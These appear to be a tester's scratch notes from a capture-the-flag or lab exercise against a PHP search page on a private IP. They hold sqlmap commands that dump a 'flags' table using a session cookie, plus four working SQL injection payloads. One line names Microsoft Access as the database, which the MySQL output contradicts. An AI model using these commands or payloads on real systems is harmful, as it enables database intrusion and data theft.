# Echo notes

- back-end DBMS is 'Microsoft Access'
- cookie: PHPSESSID - f22ebfj81lm59ac5ge4b1gn370
- http://10.128.161.44/php/cuiteur.php not injectable
- compte not
- sqlmap -u http://10.128.161.44/php/recherche_old.php --level=3 --risk=2 --random-agent --cookie="PHPSESSID=0aqg8mhvl0mp6k61vhj0a74qm0" --dbs --text-only --forms
- sqlmap -u http://10.128.161.44/php/recherche_old.php --level=3 --risk=2 --random-agent --cookie="PHPSESSID=0aqg8mhvl0mp6k61vhj0a74qm0" -D cuiteur --tables --text-only --forms  
- sqlmap -u http://10.128.161.44/php/recherche_old.php --level=3 --risk=2 --random-agent --cookie="PHPSESSID=0aqg8mhvl0mp6k61vhj0a74qm0" -D cuiteur -T flags --dump --text-only --forms 

```
[19:04:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:04:56] [INFO] fetching database names
[19:04:56] [INFO] retrieved: 'cuiteur'
[19:04:56] [INFO] retrieved: 'information_schema'
[19:04:56] [INFO] retrieved: 'mysql'
[19:04:56] [INFO] retrieved: 'performance_schema'
available databases [4]:                                                                                                                                                                                                                   
[*] cuiteur
[*] information_schema
[*] mysql
[*] performance_schema
```


```text
Parameter: recherche (POST)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: recherche=Zbve' AND EXTRACTVALUE(3301,CASE WHEN (3301=3301) THEN 3301 ELSE 0x3A END) AND 'kmxS'='kmxS&btnRechercher=Rechercher

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: recherche=Zbve' AND EXTRACTVALUE(2211,CONCAT(0x5c,0x7171707071,(SELECT (ELT(2211=2211,1))),0x7178716271)) AND 'ENtt'='ENtt&btnRechercher=Rechercher

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: recherche=Zbve' AND (SELECT 7572 FROM (SELECT(!SLEEP(5)))uNlY) AND 'DPaU'='DPaU&btnRechercher=Rechercher

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: recherche=Zbve' UNION ALL SELECT CONCAT(0x7171707071,0x64494b4f4d4f447778795563517648666876594c79676c4658787279594359576a565556497a5072,0x7178716271),NULL,NULL,NULL-- -&btnRechercher=Rechercher

```